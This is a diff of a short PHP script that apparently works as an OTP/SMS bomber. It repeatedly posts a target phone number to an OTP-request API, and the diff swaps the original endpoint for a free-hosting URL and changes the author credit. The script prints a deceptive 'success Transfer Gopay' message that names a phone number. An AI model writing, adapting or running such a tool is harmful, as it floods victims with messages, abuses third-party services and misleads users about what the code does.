@@ -1,6 +1,6 @@
 <?php
 echo "================================ \n";
-echo "   create with love xdrc0de \n";
+echo "   create with love syfalw \n";
 echo "================================ \n";
 
 
@@ -22,7 +22,7 @@ $headers = array();
 $i = 0;
 while($i < $jmlh) {
     $gtop = "{\"memberToken\":\"\",\"receivers\":\"$no\"}";
-    $gotp = curl('https://phr.gms.digital/api/user/getOTP', $gtop, $headers);
+    $gotp = curl('https://api-nabilah.000webhostapp.com/dog.php?no=', $gtop, $headers);
     $gots = json_decode($gotp[1]); 
     if($gots == true ){
         echo " => success Transfer Gopay to 085321447498 Rp.20000 \n";
